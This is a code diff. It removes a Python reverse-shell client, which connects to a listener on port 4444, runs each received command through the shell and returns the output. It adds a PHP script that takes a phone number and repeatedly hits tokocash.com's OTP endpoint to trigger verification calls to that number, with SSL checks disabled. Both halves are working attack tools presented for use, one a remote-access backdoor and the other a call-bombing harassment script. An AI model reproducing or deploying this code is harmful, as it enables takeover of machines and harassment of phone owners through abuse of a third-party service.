@@ -1,28 +1,19 @@
-import socket
-import subprocess
-import os
-
-s = socket.socket()
-s.connect(('127.0.0.1', 4444))
-
-while True:
-    cmd = s.recv(1024)
-    if cmd[:2] == 'cd':
-     os.chdir(cmd[3:])
-     dir = os.getcwd()
-     s.sendall('bacod')
-    elif cmd == 'kernel_info':
-     results = subprocess.Popen('cat /proc/version', shell=True,
-               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-               stdin=subprocess.PIPE)
-     results = results.stdout.read() + results.stderr.read()
-
-     s.sendall(results)
-
-    else:
-     results = subprocess.Popen(cmd, shell=True,
-               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-               stdin=subprocess.PIPE)
-     results = results.stdout.read() + results.stderr.read()
-
-     s.sendall('\n'+results)
+<?php
+// Limit 3x Telpon Setiap Satu Nomor
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "Subscribe RoniYT\n\n";
+echo "Nomor\nInput : ";
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
